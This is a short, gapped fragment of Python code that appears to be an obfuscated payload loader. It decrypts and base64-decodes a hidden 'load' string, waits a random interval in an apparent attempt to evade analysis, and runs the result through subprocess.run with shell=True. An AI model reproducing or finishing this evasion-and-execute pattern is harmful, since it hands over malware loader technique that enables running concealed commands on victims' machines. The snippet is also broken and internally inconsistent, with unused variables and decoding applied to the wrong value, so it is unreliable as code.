...
msg_list = a.decode().split('999999999')
msg1 = msg_list[0]
msg2 = msg_list[1]
msg = encrypt(msg2)
# 私钥解密
...
encrypted_text = cipher.encrypt(load.encode())
...
for i in range(random_int):
    load_text = cipher.decrypt(encrypted_text).decode()
    moon_load=base64.b64decode(load)
time.sleep(random_int*0.1)
moon_start=moon_load

subprocess.run(moon_start, shell=True, capture_output=True, text=True)
